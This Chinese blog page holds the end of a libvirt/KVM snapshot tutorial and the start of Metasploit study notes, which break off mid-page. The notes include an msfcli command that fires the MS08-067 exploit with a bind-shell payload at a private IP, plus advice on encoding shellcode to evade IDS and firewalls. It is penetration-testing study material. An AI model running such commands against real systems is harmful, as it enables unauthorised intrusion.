::</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        # ls -lash /var/lib/libvirt/images/*Snap*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         840K -rw-------. 1 qemu qemu 896K Oct 11 17:56 /var/lib/libvirt/images/Snap-1.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         392K -rw-------. 1 qemu qemu 448K Oct 11 17:56 /var/lib/libvirt/images/Snap-2.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         456K -rw-------. 1 qemu qemu 512K Oct 11 17:56 /var/lib/libvirt/images/Snap-3.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        1011M -rw-------. 1 qemu qemu 3.0M Oct 11 18:29 /var/lib/libvirt/images/Active.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>(5) 检查&#x27;Active&#x27;信息，现在它已经不需要backing file了，正如<em>Figure-6</em>所示::</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        # qemu-img info /var/lib/libvirt/images/Active.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        image: /var/lib/libvirt/images/Active.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        file format: qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        virtual size: 1.0G (1073741824 bytes)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        disk size: 1.0G</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        cluster_size: 65536</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>(6) 清理现场
::</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        # virsh snapshot-delete --domain RootBase Snap-3 --metadata</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>(7) 现在还可以使用下 guestfish  <strong>READ-ONLY</strong>  模式来检查下磁盘内容( <em>--ro</em> 选项)
::</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        # guestfish --ro -i -a /var/lib/libvirt/images/Active.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>快照删除 (and &#x27;offline commit&#x27;)</p><p>删除（live/offline）状态的<em>内置快照</em>很方便 ::</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-delete --domain f17vm --snapshotname snap6</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>[OR]</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-delete f17vm snap6</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>libvirt现在还没有删除外置快照的功能，但是可以使用<em>qemu-img</em>命令来完成.</p><p>比如我们有这样一条链(VM<em>offline</em>状态): base &lt;- sn1 &lt;- sn2 &lt;- sn3</p><p>现在删除第二个快照(sn2).有两种方式:</p><ul><li>Method (1): base &lt;- sn1 &lt;- sn3 (by copying sn2 into sn1)</li><li>Method (2): base &lt;- sn1 &lt;- sn3 (by copying sn2 into sn3)</li></ul><p>Method (1)</p><p>(by copying sn2 into sn1)</p><p>注意: 必须保证sn1没有被其他快照作为后端,不然就挂了!!</p><p>offline commit</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img commit sn2.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>将会<em>commit</em>所有在sn2中的改动到sn2的backing file(sn1).
qemu-img commit和virsh blockcommit类似
现在把sn3的后端指向到sn1.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img rebase -u -b sn1.qcow2 sn3.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>注意: -u代表&#x27;Unsafe mode&#x27; -- 此模式下仅仅修改了指向到的backing file名字，必须谨慎操作.
现在可以直接删除sn2</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># rm sn2.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Method (2)</p><p>(by copying sn2 into sn3)</p><p>合并数据，rebase后端:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img rebase -b sn1.qcow2 sn3.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>未使用-u模式的rebase将把数据也一并合并过去，即sn2的数据写入到sn3.
换言之: 这里使用的&#x27;Safe mode&#x27;,也是默认模式 --对sn3而言任何从
qemu-img rebase(没有-u)和和virsh blockpull类似.
backingfile（sn1）到旧的backingfile（sn2）之间发生的差异改动都将被合并到sn3中.</p><p>现在可以删除sn2了</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># rm sn2.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/libvirt">libvirt</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/kvm">kvm</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/snapshot">snapshot</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/notes/blog/2012/11/12/msf-study-note">metasploit学习笔记</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2012-11-12T00:00:00.000Z" itemprop="datePublished">2012年11月12日</time> · <!-- -->阅读需 44 分钟</div></header><div class="markdown" itemprop="articleBody"><blockquote><p>N年前使用metasploit框架过程中写下的学习笔记</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="一名词解释">一．名词解释<a class="hash-link" href="#一名词解释" title="标题的直接链接">​</a></h2><ul><li><p>exploit: 测试者利用它来攻击一个系统，程序，或服务，以获得开发者意料之外的结果。常见的 有内存溢出，网站程序漏洞利用，配置错误exploit。</p></li><li><p>payload: 我们想让被攻击系统执行的程序，如reverse shell可以从目标机器与测试者之间建立一 个反响连接，bind shell 绑定一个执行命令的通道至测试者的机器。payload也可以是只 能在目标机器上执行有限命令的程序。</p></li><li><p>shellcode: 是进行攻击时的一系列被当作payload的指令，通常在目标机器上执行之后提供一个可 执行命令的shell。</p></li><li><p>module: MSF的模块，由一系列代码组成。</p></li><li><p>listener: 等待来自被攻击机器的incoming连接的监听在测试者机器上的程序。</p></li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="二msf基础">二．MSF基础<a class="hash-link" href="#二msf基础" title="标题的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="启动msf">启动msf<a class="hash-link" href="#启动msf" title="标题的直接链接">​</a></h3><p>1、MSF提供多种用户界面：控制台模式（msfconsole），命令行模式（msfcli），图形模式（msfgui、armitage），（在老版本中还有web界面模式，后来貌似由于安全因素被取消了？）其中console模式最常用，启动方式：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /opt/framework/msf3/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfconsole</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>运行此命令后将进入msf命令提示符：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="获取帮助信息">获取帮助信息<a class="hash-link" href="#获取帮助信息" title="标题的直接链接">​</a></h3><p>2、获取命令的帮助信息：help</p><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">help connect</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfcli">msfcli<a class="hash-link" href="#msfcli" title="标题的直接链接">​</a></h3><p>3、msfcli 和msfconsole相比不提供交互方式，它直接从命令行输入所有参数并产生结果，</p><p>msfcli –h #获取帮助信息</p><p>msfcli &lt;exploit_name&gt; &lt;option=value&gt; <!-- -->[mode]</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mode:H（help）帮助</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   S（summary）显示模块信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    O（options）显示模块的可用选项</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     A（advanced）显示高级选项   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">I（ids）显示IDS EVASION 选项</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     P（payload）显示此模块可用的payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">T（targets）显示可用targets</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AC（action）显示可用actions</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C（check）运行模块测试</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   E（execute）执行选定的模块</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="模块使用示例">模块使用示例<a class="hash-link" href="#模块使用示例" title="标题的直接链接">​</a></h3><p>例子：ms08_067_netapi模块</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfcli windows/smb/ms08_067_netapi O    #查看可用选项</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfcli windows/smb/ms08_067_netapi RHOST=192.168.0.111 P #查看可用payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfcli windows/smb/ms08_067_netapi RHOST=192.168.0.111 PAYLOAD=windows/shell/bind_tcp E   #执行 （此处O、P 等参数也可以用小写）</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="armitage使用">armitage使用<a class="hash-link" href="#armitage使用" title="标题的直接链接">​</a></h3><p>4、Armitage :MSF的一个图形接口</p><p>运行方式：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /opt/farmework/msf3/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">armitage</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="msf其他组件">msf其他组件<a class="hash-link" href="#msf其他组件" title="标题的直接链接">​</a></h3><p>5、MSF其他组件：</p><ul><li>MSFpayload工具：</li></ul><p>用于生成shellcode，可生成C,Ruby，JaveScript，VB格式的shellcode。
帮助信息：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload –h</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ul><li>MSFencode工具：</li></ul><p>编码压缩shellcode，过IDS ,防火墙。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfencode -h</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfencode –l 查看可用的编码器（encoders），效果最佳的是x86/shikata_ga_nai</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="三信息刺探与收集">三．信息刺探与收集<a class="hash-link" href="#三信息刺探与收集" title="标题的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="1攻击第一步基础信息收集">1、攻击第一步：基础信息收集<a class="hash-link" href="#1攻击第一步基础信息收集" title="标题的直接链接">​</a></h3><p>whois查询：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf &gt; whois example.com</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; whois 192.168.1.100</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><a href="http://searchdns.netcraft.com/%E5%9C%A8%E7%BA%BF%E6%94%B6%E9%9B%86%E6%9C%8D%E5%8A%A1%E5%99%A8IP%E4%BF%A1%E6%81%AF%E5%B7%A5%E5%85%B7" target="_blank" rel="noopener noreferrer">http://searchdns.netcraft.com/在线收集服务器IP信息工具</a></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div 